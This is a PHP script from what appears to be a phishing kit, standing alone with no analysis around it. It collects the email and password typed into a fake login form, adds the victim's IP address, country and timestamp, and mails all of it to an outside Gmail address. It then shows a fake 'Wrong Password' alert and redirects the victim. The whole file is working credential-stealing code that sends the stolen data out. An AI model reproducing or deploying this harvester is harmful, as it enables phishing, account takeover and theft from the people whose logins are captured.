<?
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$timedate = date("D/M/d, Y g(idea) a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message .= "------------------- LOGZ  -----------------\n";
$message .= "E-mail: ".$_POST["email"]."\n";
$message .= "Password: ".$_POST["password"]."\n";
$message .= "------------------ IP | INFFO --------------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "DateTime                    : ".$timedate."\n";
$message .= "country                    : ".$country."\n";
$message .= "------------------ 1GW3 HACKZ --------------\n";
$send = "songwriter004@gmail.com";

$subject = "Log in from $country";
$headers = "From:  client@details.com";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$headers .= "";
$arr=array($send, $IP);
foreach ($arr as $send)
mail($send,$subject,$message,$headers);

?>	
		  	
		   <script language=javascript>
alert('Wrong Password USED. Click Ok to revalidate the correct password.');
window.location='error.php';
</script>
<?;
?>